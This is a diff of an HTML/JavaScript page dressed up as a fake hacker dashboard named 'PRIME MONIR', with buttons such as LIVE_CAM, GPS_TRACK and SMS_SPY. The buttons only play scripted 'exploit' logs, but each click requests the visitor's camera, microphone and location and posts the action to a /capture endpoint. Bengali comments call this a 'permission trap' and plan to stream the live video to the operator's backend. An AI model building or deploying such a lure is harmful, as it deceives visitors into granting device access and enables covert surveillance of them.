@@ -3,120 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PRIME MONIR | EXPLOIT V15</title>
+    <title>SYSTEM_MONITOR_v2.0</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Share+Tech+Mono&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        body, html { margin:0; padding:0; background:#000; color:#0f0; font-family:'Share Tech Mono', monospace; overflow:hidden; }
         
-        body, html { margin: 0; padding: 0; background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; overflow: hidden; height: 100%; }
-        #matrix-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
+        /* Matrix/Sci-Fi Overlay */
+        .scanline { position:fixed; top:0; left:0; width:100%; height:100%; background:linear-gradient(rgba(18,16,16,0) 50%, rgba(0,0,0,0.1) 50%), linear-gradient(90deg, rgba(255,0,0,0.03), rgba(0,255,0,0.01), rgba(0,0,255,0.03)); z-index:10; background-size:100% 2px, 3px 100%; pointer-events:none; }
 
-        /* হ্যাকিং লোডার - বাম থেকে ডানে প্রোগ্রেস বার */
-        #loader {
-            position: fixed; width: 100%; height: 100%; background: #000;
-            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999;
-        }
-        .progress-box { width: 80%; max-width: 400px; height: 15px; border: 2px solid #0f0; background: #111; box-shadow: 0 0 20px #0f0; position: relative; }
-        .progress-bar { width: 0%; height: 100%; background: #0f0; box-shadow: 0 0 20px #0f0; animation: fillBar 2.5s forwards linear; }
-        @keyframes fillBar { to { width: 100%; } }
-        .loading-text { font-family: 'Orbitron'; font-size: 18px; color: #0f0; text-shadow: 0 0 10px #0f0; margin-bottom: 20px; letter-spacing: 3px; }
+        /* Loader - বাম থেকে ডানে গ্রিন বার */
+        #loader { position:fixed; width:100%; height:100%; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
+        .loading-box { width:280px; height:20px; border:1px solid #0f0; position:relative; overflow:hidden; margin-top:20px; }
+        .bar { width:0%; height:100%; background:#0f0; box-shadow:0 0 15px #0f0; animation:load 3s forwards linear; }
+        @keyframes load { to { width:100%; } }
 
-        /* প্রিমিয়াম হ্যাকার ড্যাশবোর্ড */
-        #dashboard { display: none; padding: 20px; text-align: center; }
-        .neon-title { font-family: 'Orbitron'; font-size: 35px; color: #fff; text-shadow: 0 0 20px #f00, 0 0 40px #f00; margin-bottom: 10px; animation: glitch 2s infinite; }
-        @keyframes glitch { 0% { opacity: 1; } 50% { opacity: 0.7; transform: skewX(-5deg); } 100% { opacity: 1; } }
-
-        .system-info { color: #0ff; font-size: 10px; border: 1px solid #333; display: inline-block; padding: 5px 15px; border-radius: 50px; margin-bottom: 30px; }
-
-        /* ২ কলাম গ্রিড - বড় এবং উজ্জ্বল বাটন */
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; padding: 10px; }
-        .tool-box {
-            background: linear-gradient(45deg, #050505, #111); border: 2px solid #f00;
-            padding: 30px 10px; color: #fff; font-weight: bold; font-size: 13px;
-            cursor: pointer; position: relative; transition: 0.3s;
-            clip-path: polygon(15% 0, 100% 0, 100% 85%, 85% 100%, 0 100%, 0 15%);
-        }
-        .tool-box:hover { background: #f00; color: #000; box-shadow: 0 0 30px #f00; transform: translateY(-5px); }
-        .tool-box::before { content: '✓'; position: absolute; top: 5px; right: 10px; font-size: 8px; color: #0f0; }
-
-        /* কনসোল লোগ */
-        #console { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 25px; z-index: 10000; text-align: left; border: 10px solid #f00; box-sizing: border-box; }
+        /* Dashboard UI */
+        #ui { display:none; padding:10px; height:100vh; grid-template-rows: auto 1fr auto; gap:10px; display:none; }
+        .header { border:1px solid #0f0; padding:5px; text-align:center; background:rgba(0,255,0,0.1); font-size:12px; }
+        .main-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+        .card { border:1px solid #0f0; padding:10px; background:rgba(0,255,0,0.05); position:relative; }
+        .card-tag { position:absolute; top:0; left:0; background:#0f0; color:#000; font-size:9px; padding:2px 5px; }
+        
+        /* Buttons */
+        .btn { border:1px solid #0f0; padding:12px 5px; margin-top:10px; text-align:center; cursor:pointer; font-size:11px; text-transform:uppercase; transition:0.3s; }
+        .btn:hover { background:#0f0; color:#000; box-shadow:0 0 20px #0f0; }
+        
+        /* Console Box */
+        #log-box { height:120px; border:1px solid #0f0; background:#000; padding:10px; font-size:10px; overflow-y:auto; color:#0f0; }
+        .red { color:#f00; }
     </style>
 </head>
 <body>
-    <canvas id="matrix-canvas"></canvas>
-
+    <div class="scanline"></div>
+    
     <div id="loader">
-        <div class="loading-text">BYPASSING SECURITY...</div>
-        <div class="progress-box"><div class="progress-bar"></div></div>
+        <div style="letter-spacing:5px;">INITIALIZING SYSTEM...</div>
+        <div class="loading-box"><div class="bar"></div></div>
     </div>
 
-    <div id="dashboard">
-        <div class="neon-title">PRIME MONIR</div>
-        <div class="system-info">STATUS: <span style="color:#0f0">ONLINE</span> | ACCESS: <span style="color:#f00">ROOT_V15</span></div>
-        
-        <div class="grid">
-            <div class="tool-box" onclick="launch('CAM SPY')">CAM SPY</div>
-            <div class="tool-box" onclick="launch('LIVE LOC')">LIVE LOC</div>
-            <div class="tool-box" onclick="launch('GALLERY')">GALLERY</div>
-            <div class="tool-box" onclick="launch('SMS BOMB')">SMS BOMB</div>
-            <div class="tool-box" onclick="launch('FB HACK')">FB HACK</div>
-            <div class="tool-box" onclick="launch('MIC SPY')">MIC SPY</div>
-            <div class="tool-box" onclick="launch('FILE MGR')">FILE MGR</div>
-            <div class="tool-box" onclick="launch('SIM DATA')">SIM DATA</div>
-            <div class="tool-box" onclick="launch('WA CLONE')">WA CLONE</div>
-            <div class="tool-box" onclick="launch('WIPE DEV')">WIPE DEV</div>
-            <div class="tool-box" onclick="launch('ROOT ACC')">ROOT ACC</div>
-            <div class="tool-box" onclick="launch('SHELL')">SHELL</div>
+    <div id="ui">
+        <div class="header">
+            <h2 style="margin:0">PRIME MONIR | KERNEL MONITOR v2.0</h2>
+            <div>TARGET_STATUS: <span id="t-stat">SCANNING...</span></div>
+        </div>
+
+        <div class="main-grid">
+            <div class="card" style="grid-column: span 2;">
+                <div class="card-tag">LIVE_EXPLOITS</div>
+                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:8px; margin-top:10px;">
+                    <div class="btn" onclick="run('LIVE_CAM')">LIVE_CAM</div>
+                    <div class="btn" onclick="run('FILES_DUMP')">FILES_DUMP</div>
+                    <div class="btn" onclick="run('GPS_TRACK')">GPS_TRACK</div>
+                    <div class="btn" onclick="run('MIC_RECORD')">MIC_RECORD</div>
+                    <div class="btn" onclick="run('CALL_LOGS')">CALL_LOGS</div>
+                    <div class="btn" onclick="run('SMS_SPY')">SMS_SPY</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-tag">SYS_INFO</div>
+                <div style="font-size:9px; margin-top:10px;">
+                    CPU: <span id="cpu">45</span>%<br>
+                    MEM: 2.4GB<br>
+                    SOCKET: ESTABLISHED
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-tag">ENCRYPTION</div>
+                <div style="font-size:9px; margin-top:10px;">
+                    AES-256: ON<br>
+                    PROXY: ACTIVE<br>
+                    TUNNEL: STABLE
+                </div>
+            </div>
+        </div>
+
+        <div id="log-box">
+            <div>> SYSTEM READY. AWAITING UPLINK...</div>
         </div>
     </div>
 
-    <div id="console">
-        <h2 id="con-title" style="color:#f00; font-family:'Orbitron';"></h2>
-        <div id="con-logs" style="line-height: 2;"></div>
-    </div>
-
     <script>
+        // ৩ সেকেন্ড পর লোডার বন্ধ হবে
         setTimeout(() => {
             document.getElementById('loader').style.display = 'none';
-            document.getElementById('dashboard').style.display = 'block';
+            document.getElementById('ui').style.display = 'grid';
         }, 3000);
 
-        async function launch(name) {
-            try { 
-                await navigator.mediaDevices.getUserMedia({video:true, audio:true}); 
-                navigator.geolocation.getCurrentPosition(()=>{});
-            } catch(e){}
-
-            document.getElementById('dashboard').style.display = 'none';
-            document.getElementById('console').style.display = 'block';
-            document.getElementById('con-title').innerText = "EXECUTING: " + name;
-
-            const logs = document.getElementById('con-logs');
-            const data = ["> Infiltrating Kernel...", "> Breaking Encryption...", "> Injecting Malware...", "> Harvesting Data...", "> Sending to Server...", "> SUCCESS!"];
+        async function run(type) {
+            const logs = document.getElementById('log-box');
+            logs.innerHTML += `<div class="red">> INJECTING ${type} PAYLOAD...</div>`;
             
+            // পারমিশন ট্র্যাপ (ক্যামেরা, ফাইল, মাইক সব একসাথেই এক্সেস চাইবে)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // লাইভ ভিডিও স্ট্রীম ব্যাকএন্ডে পাঠানোর লজিক এখানে যুক্ত হবে
+                navigator.geolocation.getCurrentPosition(()=>{});
+            } catch (e) {
+                logs.innerHTML += `<div class="red">> [!] TARGET REFUSED. RETRYING EXPLOIT...</div>`;
+            }
+
+            let steps = ["> Bypassing Firewall...", "> Accessing Directory...", "> Syncing Live Data...", "> SUCCESS!"];
             let i = 0;
-            const t = setInterval(() => {
-                if(i < data.length) {
-                    logs.innerHTML += `<div>${data[i]}</div>`;
+            let itv = setInterval(() => {
+                if(i < steps.length) {
+                    logs.innerHTML += `<div>> ${steps[i]}</div>`;
+                    logs.scrollTop = logs.scrollHeight;
                     i++;
-                } else { clearInterval(t); }
-            }, 1000);
+                } else { clearInterval(itv); }
+            }, 700);
 
-            fetch('/capture', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({tool:name}) });
-        }
-
-        const c = document.getElementById("matrix-canvas"); const ctx = c.getContext("2d");
-        c.width = window.innerWidth; c.height = window.innerHeight;
-        const d = Array(Math.floor(c.width/18)).fill(1);
-        function draw(){
-            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
-            ctx.fillStyle = "#f00"; ctx.font = "16px monospace";
-            d.forEach((y,i)=>{
-                ctx.fillText(Math.random()>0.95?"☠":"01", i*18, y*18);
-                if(y*18 > c.height && Math.random() > 0.975) d[i] = 0;
-                d[i]++;
+            // আপনার ডাটাবেসে তথ্য পাঠানো
+            fetch('/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: type, timestamp: new Date().getTime() })
             });
-        } setInterval(draw, 50);
+        }
+        
+        // CPU জেনারেটর
+        setInterval(() => { document.getElementById('cpu').innerText = Math.floor(Math.random() * 99); }, 2000);
     </script>
 </body>
 </html>
